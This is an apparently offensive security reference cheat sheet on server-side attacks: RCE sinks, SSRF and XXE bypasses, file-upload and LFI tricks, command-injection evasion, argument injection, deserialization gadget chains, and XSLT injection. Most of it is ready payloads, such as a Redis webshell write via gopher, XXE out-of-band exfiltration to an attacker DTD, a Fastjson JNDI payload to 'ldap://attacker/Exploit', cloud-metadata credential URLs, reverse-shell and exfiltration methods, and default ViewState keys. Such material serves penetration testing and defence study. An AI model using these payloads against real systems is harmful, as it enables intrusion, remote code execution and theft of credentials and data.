# Server-Side Attacks Reference

## RCE (Remote Code Execution)

### Source Audit Targets
- Command injection sinks in all languages
- File upload to webshell paths
- Deserialization entry points (PHP, Java, Python, Ruby, .NET, Node.js)
- Template injection in user-controlled renders (SSTI)
- Eval / assert / preg_replace with /e modifier
- Dynamic includes with user-controlled paths
- `create_function`, `call_user_func`, `call_user_func_array` with tainted args
- `mail()` / `mb_send_mail()` 5th parameter injection
- ImageMagick delegate abuse (MVG, MSL, SVG with embedded commands)
- FFI usage (PHP 7.4+, Python ctypes, Ruby fiddle)
- `dl()` dynamic extension loading
- `putenv()` + `mail()`/`error_log()` for LD_PRELOAD injection
- PHP-FPM/FastCGI direct socket exploitation
- `pcntl_exec()`, `pcntl_fork()` if available
- Python: `os.system()`, `subprocess.*`, `exec()`, `eval()`, `compile()`, `__import__()`, `importlib`, `code.InteractiveInterpreter`
- Node.js: `child_process.exec/spawn/fork`, `vm.runInNewContext`, `vm.Script`, `new Function()`, `require('child_process')`
- Java: `Runtime.getRuntime().exec()`, `ProcessBuilder`, JNDI injection (`lookup()` with attacker-controlled name), Expression Language injection (EL, OGNL, SpEL, MVEL, JEXL)
- Ruby: `system()`, `exec()`, backticks, `IO.popen`, `Open3`, `Kernel.send`, `ERB.new().result`
- Go: `os/exec.Command`, `syscall.Exec`
- .NET: `Process.Start`, `CodeDom`, Roslyn scripting, PowerShell runspace

---

## SSRF (Server-Side Request Forgery)

### Source Audit Targets
- URL fetching functions accepting user-controlled URLs
- Webhook/callback/notification URL parameters
- PDF generators fetching remote resources (wkhtmltopdf, Puppeteer, headless Chrome, Prince, WeasyPrint)
- Image import/resize from URL
- XML external entity resolution pointing to internal services
- SoapClient with user-controlled WSDL URL

### Bypass Techniques
- DNS rebinding to bypass IP allowlists (TTL=0, dual A records)
- Cloud metadata endpoints: `169.254.169.254` (AWS/GCP/Azure), `fd00:ec2::254`, `metadata.google.internal`, `100.100.100.200` (Alibaba)
- Protocol smuggling via `gopher://` (craft arbitrary TCP packets), `dict://`, `file://`, `ftp://`, `tftp://`, `ldap://`, `jar://` — `jar:http://127.0.0.1!/path` bypasses protocol filters that check the `jar:` scheme while the inner URL fetches `http://127.0.0.1`; two-stage fetch: downloads the JAR/ZIP from the inner URL then extracts an entry — Java-specific, works in any Java SSRF sink delegating to `java.net.URL`
- IP representation bypass: decimal (`2130706433` = `127.0.0.1`), octal (`0177.0.0.1`), hex (`0x7f000001`), IPv6 (`[::1]`, `[::ffff:127.0.0.1]`, `[0:0:0:0:0:ffff:7f00:1]`), mixed notation (`127.1`, `127.0.1`)
- IPv6 zone identifier bypass: `http://[fe80::1%25eth0]/` — `%25` is URL-encoded `%`, zone ID bypasses naive IPv6 literal strip; `http://[fe80::1%25lo]/` for loopback via zone ID; works against Python `urllib`, Go `net/url`, Node.js `url.parse` — validators strip brackets but don't handle zone identifiers
- URL parser differentials: Python `urllib` vs `requests`, Node.js `url.parse` vs `new URL()`, Go `net/url`, PHP `parse_url` — each handles authority, scheme, fragment differently
- Open redirect chaining: SSRF filter blocks internal IPs but follows redirects from allowed hosts
- SSRF via FFmpeg: HLS playlist fetching (`#EXT-X-MEDIA-SEQUENCE`), `concat` protocol, `subfile` protocol
- SSRF via headless browser: `window.location`, `<meta http-equiv="refresh">`, `<iframe src="...">`
- CRLF injection in URL to inject additional HTTP headers (smuggle internal auth headers)
- TLS-based SSRF via SNI injection
- URL shortener bypass: attacker-controlled redirect on allowed domain
- DNS pinning bypass: first resolution passes check, TTL expires, second resolution hits internal IP
- Partial SSRF: response not returned but side-channels (timing, error messages, DNS) confirm reachability
- SSRF via HTML-to-PDF: `<link>`, `<img>`, `<script src>`, `@import url()`, `<base href="http://internal">` — all fetch resources server-side

### Gopher Protocol — Internal Service Exploitation

`gopher://` lets SSRF craft arbitrary TCP payloads to unauthenticated internal services. Tool: `gopherus`.

| Service | Technique | Notes |
|---------|-----------|-------|
| Redis | `CONFIG SET dir /var/www/html` + `SET key "<?php system($_GET[0])?>"` + `SAVE` | Writes webshell; requires writable webroot |
| Redis | `CONFIG SET dbfilename shell.php` + cron-based reverse shell | Alternative write target |
| FastCGI | Gopherus generates FCGI payload with `PHP_VALUE` + known PHP file path | Requires knowing an existing `.php` path on disk |
| MySQL | Unauthenticated query execution against MySQL without password | Pre-auth only if `skip-grant-tables` or blank root password |
| SMTP | Inject `RCPT TO`, `DATA` — send phishing email from internal relay | Bypass SPF if relay is trusted |
| Memcached | Inject serialized value into cache key consumed by app | Cache poisoning / deserialization chain |

**Alternative schemes for port probing / service abuse:**
- `dict://internal:6379/INFO` — Redis banner grab (one-shot command)
- `sftp://attacker/` — triggers SSH client connection (credential leak potential)
- `ldap://` / `ldaps://` — JNDI-style lookup trigger in Java apps
- `tftp://attacker/payload` — blind UDP exfil on restricted networks

### Internal Service Targets
- Redis (write webshell via `CONFIG SET`), Memcached (inject serialized data), Elasticsearch, Docker API (`/containers/json`, `/exec`), Kubernetes API (`/api/v1/`), Consul, etcd, Zookeeper

### SSRF via PDF / Headless Browser

HTML-to-PDF engines and headless browsers render user-controlled HTML server-side — all resource fetches originate from the server.

| Engine | SSRF / LFI Vector |
|--------|-------------------|
| wkhtmltopdf | `<img src="http://169.254.169.254/latest/meta-data/">` — cloud metadata; `<iframe src="file:///etc/passwd">` — local file read |
| PD4ML, Prince, WeasyPrint | Same `<img>`/`<iframe>` vectors; also `@import url("http://internal:8080/")` for port scanning |
| Puppeteer / headless Chrome | `<script>fetch("http://internal/...")</script>` with response reflected in DOM; `window.location` redirect |
| Any engine | `<link rel="stylesheet" href="http://internal:6379/">` — port probe via CSS fetch (timing/error side-channel) |
| FFmpeg / media processors | HLS playlist `#EXT-X-MEDIA-SEQUENCE` to trigger URL fetches; `concat://` protocol; `subfile` protocol for partial file read |

Key payloads:
- Cloud metadata: `<img src="http://169.254.169.254/latest/meta-data/iam/security-credentials/">` (AWS), `http://metadata.google.internal/computeMetadata/v1/` (GCP — needs `Metadata-Flavor: Google` header, may be bypassed via redirect)
- Local file: `<iframe src="file:///etc/passwd" width="100%" height="500">` — content rendered into PDF
- Internal port scan: embed many `<img>` tags with different internal ports; render time differences reveal open ports

---

## XXE (XML External Entities)

### Attack Types
- Classic external entity: `<!ENTITY xxe SYSTEM "file:///etc/passwd">` for file read
- Parameter entities for out-of-band exfiltration: `<!ENTITY % xxe SYSTEM "http://attacker/dtd">` → external DTD calls back with file contents
- Blind XXE via error-based extraction: force parsing errors that include file contents
- XXE to SSRF: `<!ENTITY xxe SYSTEM "http://internal-service/admin">`
- XXE to RCE: `expect://command` (PHP expect extension), `jar://` protocol for file upload

### XXE in File Uploads
- DOCX (unzip → `[Content_Types].xml`, `word/document.xml`), XLSX, PPTX, SVG, XML sitemaps, RSS/Atom feeds, SOAP requests, SAML assertions, GPX files, XHTML

### XXE Sinks by Language
- **PHP:** `simplexml_load_string()`, `DOMDocument::loadXML()`, `XMLReader`, `SimpleXMLElement`
- **Java:** `DocumentBuilderFactory`, `SAXParserFactory`, `XMLInputFactory`, `TransformerFactory`, `SchemaFactory`, `Unmarshaller` — all need explicit disabling of external entities
- **Python:** `lxml.etree` (vulnerable by default), `xml.etree.ElementTree` (safe for entities but not billion laughs), `xml.sax`, `xml.dom.pulldom`
- **.NET:** `XmlDocument`, `XmlReader`, `XDocument` (older .NET versions vulnerable by default)
- **Ruby:** `Nokogiri::XML` (safe by default unless `NOENT` flag used), `REXML`

### Advanced Techniques
- Billion laughs DoS (entity expansion bomb): `<!ENTITY a "&b;&b;&b;">` nested 10+ levels
- XInclude injection: `<xi:include parse="text" href="file:///etc/passwd"/>` when you can't control DOCTYPE; full element: `<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>`
- SVG XXE: `<svg xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></svg>`
- Local DTD file inclusion for data exfiltration (use known DTD files on the system to redefine entities)
- XXE via content-type switch: change `Content-Type: application/json` to `application/xml` — many frameworks auto-parse, enabling XXE on endpoints that appear JSON-only
- **UTF-16 WAF bypass:** convert entire XML payload to UTF-16 with `iconv -f UTF-8 -t UTF-16BE payload.xml > payload16.xml` and add `<?xml version="1.0" encoding="UTF-16"?>` declaration — XML parsers must handle UTF-16 per spec, but WAF pattern matchers keyed on ASCII byte sequences (`<!DOCTYPE`, `ENTITY`, `SYSTEM`) typically don't; submit with `Content-Type: application/xml`

---

## File Operation Abuse

### Source Audit Targets
- Path traversal in file read/download/include (`../../../etc/passwd`)
- Arbitrary file write via upload, log injection, or config manipulation
- Arbitrary file delete
- Zip slip (path traversal in archive extraction: `../../shell.php` as filename in zip entry)
- Tar slip (same concept in tar archives, symlink following during extraction)
- Race conditions in temp file handling (TOCTOU)
- Symlink following (create symlink before file operation resolves target)
- Null byte injection in filenames (older PHP < 5.3.4)
- Double encoding: `%252e%252e%252f` decoded twice to `../`
- Windows-specific: UNC paths (`\\attacker\share`), device names (`CON`, `NUL`, `AUX`, `COM1`), NTFS alternate data streams (`file.php::$DATA`)
- Filename truncation: overflow max filename length to strip extension
- Encoding tricks: UTF-8 overlong encoding (`%c0%ae` for `.`), Unicode normalization (`%ef%bc%8f` fullwidth solidus for `/`)
- `.DS_Store`, `.git`, `.svn`, `.env`, `web.config`, `WEB-INF` exposure for information disclosure
- Inode/fd-based access: `/proc/self/fd/N`, `/dev/fd/N` to access deleted or restricted files
- Image processing libraries: ImageMagick (delegate injection, MSL read, SVG embed), Pillow (ghost script in EPS), libvips

### PHP-Specific File Attacks

#### LFI / Wrapper Tricks

**PHP stream wrappers for LFI:**
- `php://filter/convert.base64-encode/resource=FILE` — read source code
- `php://filter/convert.iconv.UTF-8.UTF-7/resource=FILE`
- `php://filter/read=string.rot13/resource=FILE`
- `php://filter` chained conversions: base64-decode + iconv chains to generate arbitrary file content (filter chain RCE)
- `php://input` — POST body as include content (needs `allow_url_include`)
- `data://text/plain;base64,BASE64PAYLOAD` (needs `allow_url_include`)
- `phar://uploaded.phar/test.php` — execute code from uploaded phar
- `zip://uploaded.zip#shell.php`
- `expect://command` (if expect extension loaded)
- `compress.zlib://`, `compress.bzip2://`
- `glob://` for directory listing
- `php://memory`, `php://temp` for in-memory streams

**php://filter chain RCE (no file write needed):**
- Chain `convert.iconv.*` filters to generate arbitrary PHP code byte-by-byte
- Works on any LFI with `include()` even when `allow_url_include` is off and no writable path exists
- Tool: `synacktiv/php_filter_chain_generator`, `ambionics/wrapwrap`

**LFI to RCE escalation paths:**
- Include `/proc/self/environ` (poison via User-Agent header)
- Include `/var/log/apache2/access.log` or `/var/log/nginx/access.log` (log poisoning — insert `<?php ... ?>` in User-Agent/path)
- Include uploaded files (race condition or known temp path)
- Include session files (`/tmp/sess_SESSIONID` or `/var/lib/php/sessions/sess_SESSIONID`)
- Include `/proc/self/fd/N` (leaked open file descriptors)
- PHP session upload progress (`session.upload_progress`) race
- PEAR `pearcmd.php` trick (`?+config-create+/&file=/usr/share/php/pearcmd.php&/<?=phpinfo()?>+/tmp/x.php`)
- Nginx temp file race: large body buffered to `/var/lib/nginx/body/`, race via `/proc/PID/fd/N`
- phpinfo() + LFI race: phpinfo leaks temp file path before PHP cleanup
- `.user.ini` with `auto_prepend_file=shell.jpg` (no .htaccess needed, works in any PHP-executing dir)

#### Open_basedir Bypass
- `glob://` wrapper (list files outside basedir)
- `chdir()` + `ini_set('open_basedir', '..')` chained traversal
- Symlink creation via `symlink()`
- `SplFileInfo` / `DirectoryIterator` with `glob://`
- FastCGI / FPM direct communication
- Shared hosting via `/proc` filesystem
- `ini_set('open_basedir', '/tmp')` then operate from `/tmp`

#### Upload Bypass Techniques

**Extension tricks:** `.php`, `.phtml`, `.pht`, `.php3`, `.php4`, `.php5`, `.php7`, `.phps`, `.phar`, `.inc`, `.module`, `.profile` — test all against allowlist

**Apache-specific:**
- `.htaccess` upload with `AddType application/x-httpd-php .txt` or `SetHandler application/x-httpd-php`
- Double extension: `shell.php.jpg` (with `AddHandler` misconfiguration)
- `AddType` in existing `.htaccess`: check if uploads directory has one

**Nginx-specific:**
- Path info: `/uploads/image.jpg/nonexistent.php` (if `cgi.fix_pathinfo=1`)
- Alias traversal: `location /images { alias /var/www/images/; }` → `/images../etc/passwd`

**PHP ini override:**
- `.user.ini` with `auto_prepend_file=shell.jpg` or `auto_append_file=shell.jpg`
- Only needs the target directory to have PHP execution

**Content-type bypass:**
- GIF89a header + PHP code
- EXIF comment injection in JPEG
- Valid PNG/JPEG with PHP in metadata
- Polyglot files (valid image AND valid PHP)
- BMP header (`BM`) + PHP code
- PDF header (`%PDF-`) + PHP code
- Phar polyglot (valid JPEG + valid Phar)

**WAF bypass:**
- Filename with null byte (older systems): `shell.php%00.jpg`
- Unicode normalization tricks in filename
- NTFS alternate data streams (Windows): `shell.php::$DATA`
- Boundary confusion in multipart form data
- Chunked transfer encoding to split payload
- Overlong filename to truncate extension check
- Double extension with dot-dot: `shell..php`
- Case variation: `shell.PHP`, `shell.pHP`
- Trailing dots/spaces (Windows): `shell.php.`, `shell.php ` (NTFS strips trailing)
- Semicolon trick (IIS): `shell.asp;.jpg`
- Content-Disposition filename vs name parameter confusion

### Upload Bypass — Extended Techniques

**OPcache poisoning:** overwrite `.bin` cache files when `validate_timestamps=off`
**pearcmd.php exploitation:** `/?+config-create+/&file=/usr/share/php/pearcmd.php&/<?=phpinfo()?>+/tmp/x.php`
**Session upload progress race:** POST upload creates `$_SESSION['upload_progress_X']`, race to LFI include before `cleanup=on` deletes
**Nginx temp file race:** request body buffered to `/var/lib/nginx/body/`, race to access via `/proc/PID/fd/N`

#### Command Injection Bypass

**Space bypass:** `${IFS}`, `$IFS$9`, `{cat,/etc/passwd}`, `cat</etc/passwd`, `%09` (tab), `%0a` (newline), `X=$'\x20'&&cat${X}/etc/passwd`

**Keyword bypass:** string concatenation (`c'a't`), empty variable (`c${x}at`), backslash (`c\at`), wildcard (`/bin/c?t`, `/bin/c[a]t`, `/???/c?t`), `$'\x63\x61\x74'` (bash hex), `$(printf '\x63\x61\x74')`, rev (`echo 'tac' | rev`), base64 (`echo Y2F0 | base64 -d | sh`)

**Outbound data exfil:** DNS exfil (`` `command`.attacker.com ``), curl/wget to attacker server, `/dev/tcp` bash socket, `nc` reverse shell, `python -c 'import socket...'`

**Chaining operators:** `;`, `|`, `||`, `&&`, `\n` (`%0a`), `\r\n` (`%0d%0a`), `` ` `` (backtick substitution), `$()` (command substitution), `>(command)` (process substitution)

**WorstFit — Unicode width bypass (Windows/PHP, 2024):**
- Fullwidth Unicode characters (e.g., `Ａ` = U+FF21, `｜` = U+FF5C) bypass `escapeshellarg()` / `escapeshellcmd()` on PHP for Windows
- Windows code page conversion (UTF-8 → ANSI/OEM) strips the fullwidth prefix byte, collapsing the character to its ASCII equivalent shell metacharacter (`|`, `&`, `>`, etc.)
- Linux is unaffected; exploit requires PHP on Windows with a non-UTF-8 system code page

### Argument Injection (No Shell)

When `execFile`/`spawn` (no shell) is used, user input becomes an argv element — no shell metacharacters needed:

| Binary | Dangerous Flag | Impact |
|--------|---------------|--------|
| `curl` | `-o /tmp/shell.php` | Write arbitrary file |
| `curl` | `-d @/etc/passwd` | Exfiltrate file contents |
| `git` | `--upload-pack=evil` | RCE via custom pack handler |
| `git` | `--config=core.sshCommand=CMD` | RCE via SSH |
| `tar` | `--checkpoint-action=exec=CMD` | RCE during extraction |
| `rsync` | `-e CMD` | RCE via remote shell |
| `find` | `-exec CMD ;` | RCE via find |
| `ssh` | `-o ProxyCommand=CMD` | RCE via proxy |
| `zip`/`7z` | `-T -TT CMD` | RCE via test command |
| `wget` | `-O /tmp/shell.php` | Write arbitrary file |

Mitigation: always use `--` separator before user input to terminate flag parsing.

---

## Deserialization

### Source Audit Targets
- `unserialize()` on any user-influenced data (PHP)
- `phar://` wrapper triggering metadata deserialization (affects `file_exists`, `is_dir`, `file_get_contents`, `finfo->file`, etc.)
- Magic method chains: `__wakeup`, `__destruct`, `__toString`, `__call`, `__get`, `__set`, `__invoke`, `__isset`, `__unset`, `__callStatic`
- CVE-2016-7124: `__wakeup` bypass via property count manipulation
- Fast destruct technique (array with `[0 => object]` then modify key to `i:0` -> `i:1`)
- phpggc gadget chains for common frameworks (Laravel, Symfony, WordPress, Magento, Yii, CakePHP, Slim, Guzzle, Monolog, SwiftMailer, Doctrine)

### Java
- `ObjectInputStream.readObject()`, `XMLDecoder`, `XStream`, `SnakeYAML`, `Jackson` with polymorphic typing, `Kryo`, `Hessian`, `JMX`, RMI — gadget chains via ysoserial (Commons Collections, Commons Beanutils, BCEL, JNDI, Spring, Hibernate)
- **JNDI injection:** `InitialContext.lookup()` with `rmi://`, `ldap://`, `dns://` — remote class loading (Log4Shell pattern)

### Python
- `pickle.loads()`, `shelve`, `PyYAML` `!!python/object/apply:`, `jsonpickle`, `dill`, `cloudpickle`, `marshal.loads`
- **Pickle RCE:** `__reduce__` method returning `(os.system, ('id',))`

### Ruby
- `Marshal.load()`, YAML deserialization (`Psych.load` with `!!ruby/object:`), `ERB` template in YAML, `Oj` deserializer

### .NET
- `BinaryFormatter`, `ObjectStateFormatter`, `NetDataContractSerializer`, `SoapFormatter`, `LosFormatter`, `XmlSerializer` with known types, `Json.NET` with `TypeNameHandling != None`, `JavaScriptSerializer` with `SimpleTypeResolver` — gadget chains via ysoserial.net

### Node.js
- `node-serialize` (`_$$ND_FUNC$$_`), `funcster`, `cryo`, `serialize-javascript` — IIFE in serialized function

### Advanced Techniques
- **Phar polyglots:** craft a valid JPEG/GIF/PNG that is also a valid Phar archive — passes image validation, triggers deserialization on `phar://` access
- **Deserialization to SSRF/file read:** gadget chains that make HTTP requests or read files instead of executing commands

### Java Deserialization — Expanded Gadget Catalog

**Native serialization (ysoserial):**

| Library | Gadget Chain | Impact |
|---------|-------------|--------|
| Commons Collections 3.1-3.2.2 | CommonsCollections1-7 (LazyMap/TiedMapEntry) | RCE |
| CommonsBeanutils 1.9.2 | BeanComparator + PropertyUtils | RCE |
| AspectJWeaver 1.9.2 | ClassPathXmlApplicationContext | RCE |
| C3P0 0.9.5.2 | JndiRefForwardingDataSource | RCE via JNDI |
| Groovy 2.3.9 | MethodClosure.execute() | RCE |
| Spring 4.1.4 | Spring1 (MethodInvoker), Spring2 (BeanFactory) | RCE |
| ROME 1.0 | ObjectBean + EqualsBean | RCE |
| JDK 7u21/8u20 | Pure JRE (no third-party deps) | RCE |
| Hibernate | Hibernate1, Hibernate2 | RCE |
| Vaadin 7.7.14 | Vaadin1 | RCE |
| Wicket 6.23.0 | Wicket1 | RCE |
| Clojure 1.8.0 | Clojure chain | RCE |
| MyFaces Trinidad | CVE-2016-5019 (no MAC validation) | RCE |
| Mozilla Rhino 1.7R2 | Script eval | RCE |
| BeanShell 2.0b5 | XThis eval | RCE |

**JSON/XML/YAML deserialization sinks:**

| Library | Sink | Key Detail |
|---------|------|------------|
| jackson-databind | `ObjectMapper.readValue()` with `enableDefaultTyping()` | Multiple CVE blacklist bypasses |
| Fastjson 1.2.24 | `JSON.parseObject()` — `JdbcRowSetImpl` JNDI | autoType on by default |
| Fastjson 1.2.25-41 | `L...;` class name wrapping bypass | autoType blocklist introduced but bypassable |
| Fastjson 1.2.42 | double `LL...;;` wrapping bypass | |
| Fastjson 1.2.47 | `java.lang.Class` cache poisoning | No autoType needed — works with autoType disabled |
| XStream | `XStream.fromXML()` | Multiple CVEs |
| SnakeYAML | `Yaml.load()` | RCE via `ScriptEngineManager` |
| json-io | `JsonReader.jsonToJava()` | Memory corruption on Android |
| Genson | `genson.deserialize()` with `useRuntimeType` | RCE |
| Flexjson | `JSONDeserializer.deserialize()` | Liferay Portal affected |
| Jodd | `jsonParser.parse()` with `setClassMetadataName` | Non-default config |

**Binary format sinks:**

| Library | Sink | Key Detail |
|---------|------|------------|
| Hessian/Burlap | `AbstractHessianInput.readObject()` | MobileIron CVE-2020-15505, Dubbo |
| AMF (BlazeDS/Flamingo/GraniteDS) | AMF message deserialization | ColdFusion, Oracle BI |
| Red5 IO AMF | `Deserializer.deserialize()` | RCE |
| Kryo | `kryo.readClassAndObject()` | Type confusion |
| Apache XML-RPC | `<ex:serializable>` in POST | ALL versions (no fix exists) |

**Application-specific deserialization CVEs:**

| Target | CVE | Vector |
|--------|-----|--------|
| Oracle ADF Faces | CVE-2022-21445 | `/afr/test/remote/payload/` |
| Oracle Access Manager | CVE-2021-35587 | Pre-auth deserialization |
| Atlassian Jira DC | CVE-2020-36239 | Ehcache RMI |
| Bitbucket DC | CVE-2022-26133 | Hazelcast port 5701 |
| ManageEngine OpManager | CVE-2020-28653 | Pre-auth deserialization |
| SAP Hybris | CVE-2019-0344 | virtualjdbc |
| MySQL Connector/J | CVE-2017-3523 | autoDeserialize mode |
| Neo4j | CVE-2021-34371 | RMI shell server |

### Fastjson — Version Bypass Chain

Fastjson is the dominant JSON library in Chinese-stack Java apps (Alibaba ecosystem, Spring Boot services); version fingerprinting is critical before choosing a payload.

| Version | Bypass | Payload Shape |
|---------|--------|---------------|
| ≤ 1.2.24 | `JdbcRowSetImpl` JNDI — `autoType` on by default | `{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker/Exploit","autoCommit":true}` |
| 1.2.25–1.2.41 | `L...;` class name wrapping | `{"@type":"Lcom.sun.rowset.JdbcRowSetImpl;", ...}` |
| 1.2.42 | Double `LL...;;` wrapping | `{"@type":"LLcom.sun.rowset.JdbcRowSetImpl;;", ...}` |
| 1.2.47 | `java.lang.Class` cache poisoning | Works even with `autoType=false`; poison class cache then load target type |

Detection: look for `@type` key in JSON body. Fingerprint via error message differences for each version range.

### Java RMI

- Default port: **1099** (RMI registry); also 1098 (activation), arbitrary ephemeral ports for remote objects
- Unauthenticated registry enumeration: `rmg enum <host> <port>` lists bound names, server version, security manager status
- Tool: `remote-method-guesser` (rmg) — brute-force method signatures, call methods with ysoserial gadget payloads
- Exploit path: `rmg call <host> <port> <gadget>` triggers `readObject()` on the server when deserializing method arguments
- Class loading: if `useCodebaseOnly=false` (Java < 8u121 default), server loads classes from attacker-controlled `java.rmi.server.codebase` URL
- **GWT-RPC:** requests starting with `//GWT-RPC//` use Java native serialization for method arguments — same ysoserial gadget chains apply; sink is `AbstractRemoteServiceServlet.readContent()`

### Detection Signatures

| Format | Magic Bytes (Hex) | Base64 Prefix |
|--------|-------------------|---------------|
| Java Serialized | `AC ED 00 05` | `rO0` |
| .NET BinaryFormatter | `00 01 00 00 00 FF FF FF FF 01` | `AAEAAAD` |
| .NET ViewState | `FF 01` | `/w` |
| PHP Serialized | `4F 3A` (object), `61 3A` (array) | `Tz`, `YT` |
| Python Pickle | `80 04 95` | `gASV` |
| Ruby Marshal | `04 08` | `BAgK` |

### PHP Deserialization — Expanded

**Type juggling via deserialization:** `a:2:{s:8:"username";b:1;s:8:"password";b:1;}` — auth bypass where `true == "any_string"`

**Reference-based injection:** `O:13:"ObjectExample":2:{s:10:"secretCode";N;s:5:"guess";R:2;}` — `R:2` creates reference to secretCode, bypassing comparison

**PHAR with JPEG header (file validation bypass):**
`$phar->setStub("\xff\xd8\xff\n<?php __HALT_COMPILER(); ?>")` — JPEG magic bytes mask the PHAR

**ASCII string bypass:** use `S:` instead of `s:` in serialized data to hex-encode and bypass WAFs

### .NET Deserialization — Expanded

**Unsafe (no safe config):** `BinaryFormatter`, `ObjectStateFormatter`, `SoapFormatter`, `LosFormatter`, `NetDataContractSerializer`

**Key gadget chains:** `ObjectDataProvider` (arbitrary function calls), `ExpandedWrapper` (chain multiple types), `AssemblyInstaller` (remote assembly loading), `TypeConfuseDelegate`

**JSON.NET:** `ObjectDataProvider` invoking `Process.Start()` when `TypeNameHandling` is set

### Python Deserialization — Expanded

**PyYAML complex state manipulation:**
```yaml
!!python/object/new:str
state: !!python/tuple
- 'print(getattr(open("flag.txt"), "read")())'
```

### Ruby Deserialization — Multi-Version Chains
- **Ruby <= 2.7.2:** `Gem::Requirement` + `Gem::DependencyList` + `Gem::Source::SpecificFile` chain
- **Ruby 2.x-3.x:** `Gem::Installer` → `Gem::SpecFetcher` → `Gem::Requirement` → `Net::BufferedIO` → `Gem::RequestSet` targeting `Kernel.system`

### Node.js Deserialization — Expanded

**funcster constructor chain:** `this.constructor.constructor('return this.process')()` to escape sandbox

### Java ViewState (JSF/MyFaces)
- Default DES key: `NzY1NDMyMTA=`
- Default AES CBC key: `MDEyMzQ1Njc4OTAxMjM0NTY3ODkwMTIz`
- Server-side indicator: `value="-XXX:-XXXX"`

---

## XSLT Injection

User-controlled XSLT stylesheets or XSL parameters evaluated by the server's XSLT processor.

### Source Audit Targets
- XSLT transformation endpoints accepting a stylesheet URL or inline XSL
- XML document + XSL template where either is user-supplied
- Report/invoice generation pipelines using XSL-FO

### RCE by Runtime

| Runtime | Namespace / Function | Payload |
|---------|---------------------|---------|
| PHP (XSLTProcessor) | `xmlns:php="http://php.net/xslt"` | `<xsl:value-of select="php:function('assert', 'system(\"id\")')"/>` |
| Java (Xalan) | `xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime"` | `<xsl:variable name="rtObj" select="rt:getRuntime()"/><xsl:variable name="process" select="rt:exec($rtObj,'id')"/>` |
| .NET (MSXML / System.Xml) | `<msxsl:script language="C#" implements-prefix="user">` | Embed `System.Diagnostics.Process.Start("cmd","/c whoami")` in script block |

### SSRF via `document()` Function
```xml
<xsl:value-of select="document('http://internal:8080/admin')"/>
```
Fetches any URL server-side during transformation — full SSRF including internal metadata endpoints.

### File Read
```xml
<xsl:copy-of select="document('file:///etc/passwd')"/>
```
Reads local files into the transformation output (requires `document()` not disabled by processor config).

### Key Indicators
- Response contains XML/XSLT error traces referencing `javax.xml.transform`, `Xalan`, `libxslt`, `System.Xml.Xsl`
- Endpoint accepts `stylesheet`, `xsl`, `transform`, `template` parameters
- API that converts XML → HTML/PDF server-side using XSL
